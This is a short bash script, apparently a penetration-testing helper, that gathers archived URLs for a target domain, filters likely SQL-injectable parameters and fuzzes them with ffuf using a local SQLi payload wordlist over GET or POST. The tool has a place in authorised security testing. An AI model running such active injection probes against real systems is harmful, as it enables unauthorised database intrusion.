#!/bin/bash

#	SQLi:
#	Log file: active.SQLi.POST.log
#	Log file: active.SQLi.GET.log 

	if [ "$#" -ne 2 ] ; then
		echo "Usage: active.SQLi target.com [POST / GET]"
	
	elif [ "$2" = "POST" ] ;	then
	
		export HOST=$1

#		POST REQUEST:	ACTIVE PROBE = Higher results

		echo -e "\033[0;32mRunning\n"; waybackurls $HOST | uro | gf sqli | qsreplace "FUZZ" | while read url ; do ffuf -X POST -u "$url" -c -w $HOME/WORKZONE/payloads/SQLI.1 -ac -sa -t 20 -od active.SQLi.POST.log -d "FUZZ"; done	

	elif [ "$2" = "GET" ] ; then
	
		export HOST=$1

#		GET REQUEST:	PASSIVE PROBE = Less results

		echo -e "\033[0;32mRunning\n"; waybackurls $HOST | uro | gf sqli | qsreplace "FUZZ"| while read url ; do ffuf -u "$url" -c -w $HOME/WORKZONE/payloads/SQLI.1 -ac -sa -t 20 -od active.SQLi.GET.log ; done		

	fi
	
#	--------------------------------------------------------------------------------------------------------------
#	--------------------------------------------------------------------------------------------------------------